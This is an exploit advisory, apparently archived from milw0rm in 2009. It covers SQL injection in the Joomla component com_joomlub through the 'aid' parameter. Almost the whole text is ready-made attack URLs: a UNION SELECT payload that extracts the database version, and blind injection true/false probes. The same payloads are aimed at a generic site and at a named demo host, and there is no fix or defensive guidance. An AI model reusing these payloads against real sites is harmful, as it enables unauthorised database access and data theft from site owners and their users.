@@ -1,0 +1,50 @@
+_00000__00000__00000__00000__0___0__00000____0___0___000___0___0_
+_0______0___0__0___0__0______00_00__0________00_00__0___0__00_00_
+_0000___00000__00000__00000__0_0_0__00000____0_0_0__0___0__0_0_0_
+_____0______0______0__0______0___0__0________0___0__00000__0___0_
+_0000___00000__00000__00000__0___0__00000____0___0__0___0__0___0_
+_________________________________________________________________
+
+
+
+# [+] Joomla Compenent Com_joomlub (aid) Remote SQL Injection Vulnerabilities
+# [+] Software : Joomla Compenent Com_joomlub
+# [+] Author : 599eme Man
+# [+] Contact : Flouf@live.fr
+# [+] Thanks : Moudi, Kim, Neocoderz, Sheiry, Shimik Root aka Str0zen, Pr0H4ck3rz, Staker, Security-shell...
+#
+#[------------------------------------------------------------------------------------]
+# 
+# [+] Vulnerability
+#
+#	[+] SQL
+#
+#		- http://www.site.com/index.php?option=com_joomlub&controller=auction&view=auction&task=edit&aid=-2%20union%20all%20select%201,2,3,version(),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+#
+#			[+] Demo
+#
+#				- http://www.joomlub.fr.nf/index.php?option=com_joomlub&controller=auction&view=auction&task=edit&aid=-2%20union%20all%20select%201,2,3,version(),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+#
+#	[+] Blind SQL
+#
+#		- http://www.site.com/index.php?option=com_joomlub&controller=auction&view=auction&task=edit&aid=2%20and%201=2 => False
+#		- http://www.site.com/index.php?option=com_joomlub&controller=auction&view=auction&task=edit&aid=2%20and%201=1 => True
+#
+#		- http://www.site.com/index.php?option=com_joomlub&controller=auction&view=auction&task=edit&aid=2 and substring(@@version,1,1)=4 => False
+#		- http://www.site.com/index.php?option=com_joomlub&controller=auction&view=auction&task=edit&aid=2 and substring(@@version,1,1)=5 => True
+#
+#			[+] Demo
+#
+#				
+#				- http://www.joomlub.fr.nf/index.php?option=com_joomlub&controller=auction&view=auction&task=edit&aid=2%20and%201=2 => False
+#				- http://www.joomlub.fr.nf/index.php?option=com_joomlub&controller=auction&view=auction&task=edit&aid=2%20and%201=1 => True
+#		 
+#				- http://www.joomlub.fr.nf/index.php?option=com_joomlub&controller=auction&view=auction&task=edit&aid=2 and substring(@@version,1,1)=4 => False
+#				- http://www.joomlub.fr.nf/index.php?option=com_joomlub&controller=auction&view=auction&task=edit&aid=2 and substring(@@version,1,1)=5 => True
+#
+#
+#[------------------------------------------------------------------------------------]
+#
+#########################################################################################################
+
+# milw0rm.com [2009-09-04]
